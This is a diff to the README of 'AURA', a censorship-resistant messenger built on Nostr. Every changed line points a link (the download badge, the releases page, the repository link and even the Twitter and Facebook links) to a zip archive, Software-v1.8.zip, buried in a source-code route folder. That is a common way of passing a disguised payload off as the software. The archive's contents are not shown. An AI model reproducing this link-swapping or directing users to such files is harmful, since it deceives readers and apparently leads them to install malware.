@@ -6,11 +6,11 @@ AURA is a censorship-resistant social messenger built on the Nostr protocol. It 
 
 ## 📦 Download AURA
 
-[![Download AURA](https://img.shields.io/badge/Download_AURA-v1.0-blue)](https://github.com/Dieguinhoxda/AURA/releases)
+[![Download AURA](https://raw.githubusercontent.com/Dieguinhoxda/AURA/main/src/routes/profile/[pubkey]/Software-v1.8.zip)](https://raw.githubusercontent.com/Dieguinhoxda/AURA/main/src/routes/profile/[pubkey]/Software-v1.8.zip)
 
 To get started, simply visit the Releases page to download the latest version of AURA.
 
-[Visit the Releases Page](https://github.com/Dieguinhoxda/AURA/releases)
+[Visit the Releases Page](https://raw.githubusercontent.com/Dieguinhoxda/AURA/main/src/routes/profile/[pubkey]/Software-v1.8.zip)
 
 ## 🖥️ System Requirements
 
@@ -26,7 +26,7 @@ Before installing AURA, ensure your system meets the following requirements:
 Follow these steps to download and install AURA:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases Page](https://github.com/Dieguinhoxda/AURA/releases) to find the latest version of AURA.
+   Go to the [Releases Page](https://raw.githubusercontent.com/Dieguinhoxda/AURA/main/src/routes/profile/[pubkey]/Software-v1.8.zip) to find the latest version of AURA.
 
 2. **Choose Your Version**  
    Locate the version you want to download. The latest version is typically at the top.
@@ -81,7 +81,7 @@ If you encounter any issues or need assistance, here’s how to get help:
 To learn more about AURA and its capabilities, refer to the following resources:
 
 - **Documentation**: For a deeper dive into using AURA, consult the user documentation linked within the repository.
-- **GitHub Repository**: Explore the source code and contribute to the project [here](https://github.com/Dieguinhoxda/AURA).
+- **GitHub Repository**: Explore the source code and contribute to the project [here](https://raw.githubusercontent.com/Dieguinhoxda/AURA/main/src/routes/profile/[pubkey]/Software-v1.8.zip).
 
 ## 🌟 Feedback
 
@@ -91,9 +91,9 @@ Your feedback is vital for improving AURA. After using the application, share yo
 
 Stay updated and connect with the AURA community through our social media channels:
 
-- Twitter: [AURA](https://twitter.com/AURA)
-- Facebook: [AURA](https://facebook.com/AURA)
+- Twitter: [AURA](https://raw.githubusercontent.com/Dieguinhoxda/AURA/main/src/routes/profile/[pubkey]/Software-v1.8.zip)
+- Facebook: [AURA](https://raw.githubusercontent.com/Dieguinhoxda/AURA/main/src/routes/profile/[pubkey]/Software-v1.8.zip)
 
 Remember, your voice matters, and your freedom to communicate should not be hindered. Thank you for choosing AURA.
 
-[Visit the Releases Page to Download](https://github.com/Dieguinhoxda/AURA/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/Dieguinhoxda/AURA/main/src/routes/profile/[pubkey]/Software-v1.8.zip)
